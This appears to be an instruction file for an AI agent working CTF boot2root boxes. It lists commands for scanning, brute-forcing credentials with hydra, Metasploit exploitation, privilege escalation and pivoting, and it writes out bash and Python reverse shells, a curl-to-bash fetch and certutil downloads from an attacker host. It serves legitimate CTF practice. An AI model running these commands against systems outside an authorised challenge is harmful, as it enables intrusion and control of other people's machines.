# Boot2root / Network

Covers host enumeration, service exploitation, shell access, and privilege escalation.

## Triggers

A target host, IP, or box to attack; challenge says "get a shell" or "find user.txt/root.txt"; privesc or lateral movement required; a full pentest-style engagement on a CTF platform (HackTheBox, TryHackMe, etc.).

## Workflow

1. Discover the host and map all open ports.
2. Enumerate each service for versions, misconfigurations, and credentials.
3. Exploit a foothold vulnerability to obtain an initial shell.
4. Stabilize the shell for full interactivity.
5. Escalate privileges to root/SYSTEM.
6. Loot user.txt and root.txt (or the event's flag files).
7. Perform lateral movement if multiple hosts are in scope.

## Commands

Run these via the kali skill (it owns host/auth):

**Recon**
```bash
# Host discovery
nmap -sn <range>
# Full port + service scan
nmap -sC -sV -p- -oN scan.txt <target>
# UDP top ports
nmap -sU --top-ports 50 <target>
```

**Service enumeration**
```bash
# Web
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h http://<target>

# SMB
enum4linux -a <target>
smbmap -H <target>
netexec smb <target> -u '' -p ''

# DNS zone transfer
dig axfr @<target> <domain>

# Brute-force credentials
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> <service>
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> ssh
```

**Exploitation**
```bash
# Search for known exploits
searchsploit '<service> <version>'
# Metasploit
msfconsole -q
# Inside msfconsole:
#   use <module>
#   set RHOSTS <target>
#   set LHOST <lhost>
#   run
```

**Shell stabilization**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl-Z
stty raw -echo; fg
export TERM=xterm
```

**Reverse shell / listener**
```bash
# Listener on attacker
nc -lvnp <port>
# Bash reverse shell (run on target, substituting lhost and port)
bash -i >& /dev/tcp/<lhost>/<port> 0>&1
# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<lhost>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**Privilege escalation**
```bash
# Linux
curl -s http://<lhost>:<port>/linpeas.sh | bash
sudo -l                                    # check sudo rights + GTFOBins
find / -perm -4000 2>/dev/null             # SUID binaries
./pspy64                                   # monitor cron jobs without root
# Kernel exploit suggester
uname -a && cat /etc/os-release

# Windows
.\winPEASx64.exe
whoami /priv
# Check SeImpersonatePrivilege → PrintSpoofer / Potato exploits
```

**File transfer**
```bash
# From attacker to target (Linux)
python3 -m http.server <port>
# On target:
wget http://<lhost>:<port>/<file>
curl -O http://<lhost>:<port>/<file>
# Windows (on target)
certutil -urlcache -split -f http://<lhost>:<port>/<file> <file>
```

**Lateral movement / pivoting**
```bash
# Reuse looted creds across hosts
netexec smb <range> -u <user> -p <pass>
# SSH local port-forward to reach an internal-only service
ssh -L <lport>:<internal-host>:<rport> <user>@<target>
# Tunnel a whole subnet through the foothold, then run tools via proxychains
# chisel:  attacker> chisel server -p <port> --reverse
#          target>   chisel client <lhost>:<port> R:socks
# ligolo-ng: agent on target -> proxy on attacker, then add the route
proxychains nmap -sT -Pn <internal-range>
```

## Pitfalls

- `tcpwrapped` = handshake completed but the service closed before sending a banner (often a wrapper/firewall), not a scan-speed problem. Re-probe a specific port with `-sV --version-intensity 9` or `nc`/manual. Separately, firewall rate-limiting can hide ports at `-T4/-T5`; retry at `-T2`.
- Unstable shells lose progress; stabilize before running heavy enumeration.
- LHOST must be the VPN/tunnel interface IP when attacking CTF platform boxes — verify with `ip a`.
- User flag is `user.txt` (often in `/home/<user>/`); root flag is `root.txt` (usually `/root/`).

## Flag extraction

```bash
cat /home/<user>/user.txt
cat /root/root.txt
# Search the whole filesystem if the location is non-standard
find / -name 'flag*' -o -name '*.txt' 2>/dev/null | xargs grep -lE 'flag\{|CTF\{' 2>/dev/null
```
